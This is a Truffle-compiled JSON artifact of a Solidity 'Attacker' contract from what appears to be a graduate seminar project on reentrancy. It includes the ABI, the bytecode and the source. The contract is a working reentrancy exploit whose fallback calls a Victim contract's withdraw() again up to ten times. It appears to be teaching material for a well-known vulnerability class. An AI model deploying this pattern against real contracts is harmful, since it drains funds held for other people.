{
  "contractName": "Attacker",
  "abi": [
    {
      "inputs": [
        {
          "name": "a",
          "type": "address"
        }
      ],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "constructor"
    },
    {
      "payable": true,
      "stateMutability": "payable",
      "type": "fallback"
    },
    {
      "anonymous": false,
      "inputs": [
        {
          "indexed": false,
          "name": "c",
          "type": "uint256"
        },
        {
          "indexed": false,
          "name": "balance",
          "type": "uint256"
        }
      ],
      "name": "LogFallBack",
      "type": "event"
    },
    {
      "constant": false,
      "inputs": [],
      "name": "attack",
      "outputs": [],
      "payable": false,
      "stateMutability": "nonpayable",
      "type": "function"
    }
  ],
  "bytecode": "0x608060405234801561001057600080fd5b506040516020806102a483398101806040528101908080519060200190929190505050806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610221806100836000396000f300608060405260043610610041576000357c0100000000000000000000000000000000000000000000000000000000900463ffffffff1680639e5faafc1461013f575b6001600081548092919060010191905055507fa0818ef41bda627a5bd965e5ac773236bca9739f449ed12ce7b62b913e89498360015434604051808381526020018281526020019250505060405180910390a1600a600154101561013d576000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b15801561012457600080fd5b505af1158015610138573d6000803e3d6000fd5b505050505b005b34801561014b57600080fd5b50610154610156565b005b6000809054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633ccfd60b6040518163ffffffff167c0100000000000000000000000000000000000000000000000000000000028152600401600060405180830381600087803b1580156101db57600080fd5b505af11580156101ef573d6000803e3d6000fd5b505050505600a165627a7a72305820e38ebfc83ca93c07ea982bf6129005ede2d90a6f4e63683016e5a7806a5ddc290029",
  "source": "pragma solidity ^0.4.23;\nimport './Victim.sol';\n\n/**\n * The attack contract does this and that...\n */\ncontract Attacker {\n  Victim v;\n  uint counter;\n  event LogFallBack(uint c, uint balance);\n\n  constructor(address a){\n    v = Victim(a);\n  }\n\n  function attack(){\n    v.withdraw();\n  }\n\n\n  function() payable{\n    counter++;\n    emit LogFallBack(counter, msg.value);\n    if(counter<10){\n      v.withdraw();\n    }\n  }\n}\n",
  "sourcePath": "/Users/coda/Desktop/Grad-CSE/704 seminar/project/reentrancy/contracts/Attacker.sol",
  "compiler": {
    "name": "solc",
    "version": "0.4.23+commit.124ca40d.Emscripten.clang"
  },
  "schemaVersion": "3.0.9",
  "updatedAt": "2019-05-05T01:29:34.565Z",
  "devdoc": {
    "methods": {}
  },
  "userdoc": {
    "methods": {}
  }
}